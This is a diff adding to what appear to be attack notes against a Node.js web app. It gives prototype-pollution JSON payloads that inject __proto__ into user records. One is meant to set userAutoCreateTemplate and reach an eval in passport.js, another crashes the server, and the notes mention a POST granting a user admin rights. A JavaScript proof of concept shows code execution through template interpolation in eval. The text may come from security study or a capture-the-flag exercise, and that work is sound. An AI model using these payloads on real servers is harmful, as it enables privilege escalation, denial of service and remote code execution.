@@ -132,6 +132,8 @@ Content-Type: application/octet-stream
 
 
 This POST adds admin privileges to the user test1.
+
+
 To change a user you do not have to know the _id. It can be removed as using the wrong _id causes the login to crash. 
 For something to happen using __proto__ you first have to create a user with for example:
 [{"username":"test1","lcUsername":"test1","password":"12","joinDate":"2026-04-23T14:17:15.653Z","licensePlate":"AAA111","img":"/images/profile.png"}]
@@ -139,3 +141,30 @@ Then you can use:
 [{"username":"test1","lcUsername":"test1","password":"12","joinDate":"2026-04-23T14:17:15.653Z","licensePlate":"AAA111","img":"/images/profile.png", "__proto__":{"userAutoCreateTemplate":true}}]
 This makes the server explode.
 The idea is trying to add userAutoCreateTemplate to "options" in passport.js. This would allow us to get to the eval function that can be used to run javascript code.
+
+
+
+[{"username":"test1","lcUsername":"test1","password":"12","__proto__":{"toString":true}}]
+Results in TypeError: Object.prototype.toString.call is not a function and DoS.
+
+
+
+This code simulates an execution of an "attack", the trick is to use ${} to make JS run code
+------------
+const options = {};
+options.userAutoCreateTemplate = '${console.log("success")}';
+const username = "test1";
+const password = 12;
+
+const wrapperFunction = `(function() {
+  const username = '${username}';
+  const passport = '${password}';
+  return \`${options.userAutoCreateTemplate}\`;
+})()`;
+
+console.log(wrapperFunction)
+
+const result = eval(wrapperFunction);
+-------------
+
+
